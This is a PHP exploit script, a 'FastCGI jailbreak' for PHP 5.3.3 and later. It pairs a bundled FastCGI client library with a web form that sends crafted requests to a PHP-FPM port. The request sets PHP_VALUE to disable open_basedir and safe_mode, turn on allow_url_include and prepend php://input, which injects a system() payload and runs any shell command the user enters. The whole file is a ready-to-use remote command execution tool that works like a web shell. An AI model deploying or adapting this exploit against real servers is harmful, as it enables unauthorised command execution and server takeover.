<?php
/**
 * PHP 5.3.3+ FASTCGI jailbreak
 *
 * @author      wofeiwo <wofeiwo#80sec.com>
 * @date        2013-01-23 
 * @version     1.0
 * @reference   https://bugs.php.net/bug.php?id=64103 
 * @reference   http://www.wooyun.org/bugs/wooyun-2013-018116 (Chinese)
 * @note        disable php security settings, but can't overwrite disable_function/disable_classes.
 */
?>
PHP Version(Must >= 5.3.3): <?php echo phpversion();?><br />
PHP Sapi Name(Must FASTCGI): <?php echo php_sapi_name();?><br />
Safe_mode: <?php echo ini_get("safe_mode");?><br />
Disable_functions: <?php echo ini_get("disable_functions");?><br />
Open_basedir: <?php echo ini_get("open_basedir");?><br />
<form action="" method="POST" name="form">
    Fastcgi Host: <input type="text" name="host" value="<?php echo $_REQUEST['host']?$_REQUEST['host']:"127.0.0.1";?>" /><br />
    Fastcgi Port: <input type="text" name="port" value="<?php echo $_REQUEST['port']?$_REQUEST['port']:"9000";?>" /><br />
    Execute Script: <input type="text" name="filepath" value="<?php echo $_REQUEST['filepath']?$_REQUEST['filepath']:__FILE__;?>" /><br />
    Execute CMD: <input type="text" name="cmd" value="<?php echo $_REQUEST['cmd']?$_REQUEST['cmd']:'id; uname -a';?>" /><br />
    <input type="submit" name="submit" value="submit" />
</form>
<pre>

<?php
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */

/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron <pierrick@webstart.fr> 
 * @version     1.0
 */
class FCGIClient
{
    const VERSION_1            = 1;

    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;

    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;

    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;

    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';

    const HEADER_LEN           = 8;

    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;

    /**
     * Host
     * @var String
     */
    private $_host = null;

    /**
     * Port
     * @var Integer
     */
    private $_port = null;

    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;

    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }

    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }

    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }

    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this->_sock) {
            $this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }

    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }

    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }

    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();

        if ($length === null) {
            $length = strlen($data);
        }

        $p = 0;

        while ($p != $length) {

            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data{$p++}) << 16);
                $nlen |= (ord($data{$p++}) << 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data{$p++}) << 16);
                $vlen |= (ord($data{$p++}) << 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }

        return $array;
    }

    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }

    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }

    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this->connect();

        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));

        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }

    /**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    {
        $response = '';
        $this->connect();

        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));

        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');

        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');

        fwrite($this->_sock, $request);

        do {
            $resp = $this->readPacket();
            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                $response .= $resp['content'];
            }
        } while ($resp && $resp['type'] != self::END_REQUEST);

        if (!is_array($resp)) {
            throw new Exception('Bad request');
        }

        switch (ord($resp['content']{4})) {
            case self::CANT_MPX_CONN:
                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
                break;
            case self::OVERLOADED:
                throw new Exception('New request rejected; too busy [OVERLOADED]');
                break;
            case self::UNKNOWN_ROLE:
                throw new Exception('Role value not known [UNKNOWN_ROLE]');
                break;
            case self::REQUEST_COMPLETE:
                return $response;
        }
    }
}
?>
<?php
// real exploit start here
// 
// 
if (!isset($_REQUEST['cmd'])) {
    die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
    $filepath = __FILE__;
}else{
    $filepath = $_REQUEST['filepath'];
}

$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];

if (strpos($_REQUEST['host'], 'unix://') !== false) {
    $client = new FCGIClient($_REQUEST['host']);
}else{
    $client = new FCGIClient($_REQUEST['host'], $_REQUEST['port']);
}

$code = "<?php system(\$_REQUEST['command']);?>"; // php payload
if (version_compare(PHP_VERSION, '5.4.0') >= 0) {
    $php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
}else{
    $php_value = "allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nauto_prepend_file = php://input";
}

$params = array(       
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD'    => 'POST',
        'SCRIPT_FILENAME'   => $filepath,
        'SCRIPT_NAME'       => $req,
        'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
        'REQUEST_URI'       => $uri,
        'DOCUMENT_URI'      => $req,
        #'DOCUMENT_ROOT'     => '/',
        'PHP_VALUE'         => $php_value,
        'SERVER_SOFTWARE'   => '80sec/wofeiwo',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REMOTE_PORT'       => '9985',
        'SERVER_ADDR'       => '127.0.0.1',
        'SERVER_PORT'       => '80',
        'SERVER_NAME'       => 'localhost',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
echo "Call: $uri\n\n";
echo strstr($client->request($params, $code), "PHP Version", true)."\n";
?>
</pre>
